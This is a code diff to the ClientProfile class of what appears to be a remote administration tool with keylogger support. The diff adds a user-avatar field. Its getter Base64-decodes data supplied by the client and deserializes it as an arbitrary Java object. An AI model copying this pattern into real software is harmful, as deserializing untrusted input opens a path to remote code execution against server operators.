@@ -30,10 +30,13 @@ import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
 
 import com.subterranean_security.crimson.core.Reporter;
+import com.subterranean_security.crimson.core.exception.InvalidObjectException;
 import com.subterranean_security.crimson.core.proto.Delta.EV_ProfileDelta;
 import com.subterranean_security.crimson.core.proto.Misc.GraphicsDisplay;
 import com.subterranean_security.crimson.core.proto.Misc.NetworkInterface;
+import com.subterranean_security.crimson.core.util.B64;
 import com.subterranean_security.crimson.core.util.CUtil;
+import com.subterranean_security.crimson.core.util.ObjectTransfer;
 import com.subterranean_security.crimson.sv.keylogger.Log;
 import com.subterranean_security.crimson.sv.profile.attribute.Attribute;
 import com.subterranean_security.crimson.sv.profile.attribute.TrackedAttribute;
@@ -51,6 +54,7 @@ public class ClientProfile implements Serializable {
 	// Transient attributes
 	private transient ImageIcon locationIcon;
 	private transient ImageIcon osNameIcon;
+	private transient ImageIcon userIcon;
 
 	// General attributes
 	private Log keylog;
@@ -65,6 +69,7 @@ public class ClientProfile implements Serializable {
 	private Attribute timezone;
 	private Attribute language;
 	private Attribute username;
+	private Attribute userAvatar;
 	private Attribute userStatus;
 	private Attribute userHome;
 	private Attribute activeWindow;
@@ -120,6 +125,7 @@ public class ClientProfile implements Serializable {
 		timezone = new UntrackedAttribute();
 		language = new UntrackedAttribute();
 		username = new UntrackedAttribute();
+		userAvatar = new UntrackedAttribute();
 		userStatus = new UntrackedAttribute();
 		userHome = new UntrackedAttribute();
 		activeWindow = new UntrackedAttribute();
@@ -177,7 +183,8 @@ public class ClientProfile implements Serializable {
 
 	}
 
-	public void loadOsIcon() {
+	public void loadIcons() {
+		// os icon
 		if (osNameIcon == null && osName.get() != null) {
 			String icon = osName.get().replaceAll(" ", "_").toLowerCase();
 
@@ -196,6 +203,11 @@ public class ClientProfile implements Serializable {
 			}
 			osNameIcon.setDescription(osName.get());
 
+		}
+
+		// user avatar
+		if (userIcon == null && userAvatar.get() != null) {
+			userIcon = getUserAvatar();
 		}
 	}
 
@@ -261,6 +273,18 @@ public class ClientProfile implements Serializable {
 
 	public void setUsername(String username) {
 		this.username.set(username);
+	}
+
+	public ImageIcon getUserAvatar() {
+		try {
+			return (ImageIcon) ObjectTransfer.Default.deserialize(B64.decode(userAvatar.get()));
+		} catch (InvalidObjectException e) {
+			return null;
+		}
+	}
+
+	public void setUserAvatar(String userAvatar) {
+		this.userAvatar.set(userAvatar);
 	}
 
 	public String getUserStatus() {
@@ -509,6 +533,10 @@ public class ClientProfile implements Serializable {
 
 	public ImageIcon getOsNameIcon() {
 		return osNameIcon;
+	}
+
+	public ImageIcon getUserIcon() {
+		return userIcon;
 	}
 
 	public Date getLastUpdate() {
@@ -765,6 +793,9 @@ public class ClientProfile implements Serializable {
 		}
 		if (c.hasUserName()) {
 			setUsername(c.getUserName());
+		}
+		if (c.hasUserAvatar()) {
+			setUserAvatar(c.getUserAvatar());
 		}
 		if (c.hasUserStatus()) {
 			setUserStatus(c.getUserStatus());
